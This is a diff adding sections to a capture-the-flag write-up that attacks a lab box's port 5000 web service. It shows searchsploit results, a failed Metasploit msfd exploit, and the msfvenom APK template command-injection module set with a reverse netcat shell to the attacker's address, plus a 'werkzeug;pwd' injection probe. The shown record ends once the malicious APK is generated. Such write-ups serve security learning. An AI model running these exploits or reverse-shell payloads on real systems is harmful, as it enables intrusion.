@@ -3,6 +3,12 @@
 
 ### 2. Port 5000 HTTP Enumeration
 
+### 3. Port 5000 HTTP Attack Attempt 1
+
+### 4. Port 5000 HTTP Attack Attempt 2
+
+### 5. Port 5000 HTTP Attack Attempt 3
+
 # Attack
 ## 1. NMAP
 Took a long time to run, but here it is.
@@ -237,3 +243,95 @@ Upgrade-Insecure-Requests: 1
 search=werkzeug%3Bpwd&action=searchsploit
 ```
 This time however, we get an error `stop hacking me - well hack you back`.
+
+## 4. Port 5000 HTTP Attack Attempt 2
+With clues from online, it turns out that I needed more SearchSploits.
+```
+ippoeug@kali:~$ searchsploit nmap
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Android - binder Use-After-Free of VMA via race Between reclaim and munmap                                                          | android/dos/46357.txt
+Android - Inter-Process munmap due to Race Condition in ashmem                                                                      | android/dos/43464.txt
+Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution (Metasploit)                                                     | multiple/remote/27135.rb
+BaconMap 1.0 - Local File Disclosure                                                                                                | php/webapps/15234.txt
+BaconMap 1.0 - SQL Injection                                                                                                        | php/webapps/15233.txt
+Google Android - Inter-process munmap in android.util.MemoryIntArray                                                                | android/dos/41354.txt
+Google Android - Inter-Process munmap with User-Controlled Size in android.graphics.Bitmap                                          | android/remote/40874.txt
+Microsoft Edge - 'UnmapViewOfFile' ACG Bypass                                                                                       | windows/dos/44096.txt
+Nmap - Arbitrary File Write                                                                                                         | linux/remote/38741.txt
+Novell NetMail 3.52d - NMAP STOR Buffer Overflow (Metasploit)                                                                       | windows/remote/16813.rb
+PaX - Double-Mirrored VMA munmap Privilege Escalation                                                                               | linux/local/876.c
+Snortreport - '/nmap.php' / 'nbtscan.php' Remote Command Execution (Metasploit)                                                     | php/webapps/17947.rb
+Zenmap (Nmap) 7.70 - Denial of Service (PoC)                                                                                        | windows_x86/dos/45357.txt
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+```
+Nothing here.
+```
+hippoeug@kali:~$ searchsploit searchsploit
+Exploits: No Results
+Shellcodes: No Results
+```
+Nope. Funny though.
+```
+hippoeug@kali:~$ searchsploit msf
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Cisco IOS 12 MSFC2 - Layer 2 Frame Denial of Service                                                                                | hardware/dos/23638.pl
+CmsFaethon 2.2.0 (ultimate.7z) - Multiple Vulnerabilities                                                                           | php/webapps/11894.txt
+CmsFaethon 2.2.0 - 'item' SQL Injection                                                                                             | php/webapps/8054.pl
+Joomla! Component com_jmsfileseller - Local File Inclusion                                                                          | php/webapps/17338.txt
+Liferay Portal - Java Unmarshalling via JSONWS RCE (Metasploit)                                                                     | java/remote/48332.msf
+Metasploit Framework - 'msfd' Remote Code Execution (Metasploit)                                                                    | ruby/remote/44570.rb
+Metasploit Framework - 'msfd' Remote Code Execution (via Browser) (Metasploit)                                                      | ruby/remote/44569.rb
+Microsoft Edge Chakra - 'AppendLeftOverItemsFromEndSegment' Out-of-Bounds Read                                                      | windows/dos/43522.js
+PHP-fusion dsmsf Mod Downloads - SQL Injection                                                                                      | php/webapps/12028.txt
+unrar 5.40 - 'VMSF_DELTA' Filter Arbitrary Memory Write                                                                             | multiple/dos/42245.txt
+webERP 4.0.1 - 'InputSerialItemsFile.php' Arbitrary File Upload                                                                     | php/webapps/35333.py
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Shellcode Title                                                                                                                    |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Linux/x86 - Read File (/etc/passwd) + MSF Optimized Shellcode (61 bytes)                                                            | linux_x86/45416.c
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+```
+Ayy! `Metasploit Framework - 'msfd' Remote Code Execution (Metasploit)` is looking promising, let's give that a shot!
+```
+msf5 > use exploit/multi/misc/msfd_rce_remote
+[*] No payload configured, defaulting to generic/shell_reverse_tcp
+...
+msf5 exploit(multi/misc/msfd_rce_remote) > show options
+...
+msf5 exploit(multi/misc/msfd_rce_remote) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:6969 
+[*] Exploit completed, but no session was created.
+```
+Nope. Time for something new.
+
+## 5. Port 5000 HTTP Attack Attempt 3
+With even more clues, it turns out there is a more recent CVE. 
+
+There's a [`Metasploit Framework 6.0.11 - msfvenom APK template command injection`](https://www.exploit-db.com/exploits/49491) exploit, where an [advisory](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md) has been written for it. More importantly, a [guide](https://github.com/rapid7/metasploit-framework/pull/14331) of sorts to utilize this exploit.
+
+Since there's a Metasploit module written for it, we shall use it.
+```
+msf6 > use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options
+
+Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  msf.apk          yes       The APK file name
+...
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > exploit
+
+[+] msf.apk stored at /home/hippoeug/.msf4/local/msf.apk
+```
+Interesting! This generates a `.apk` file! 
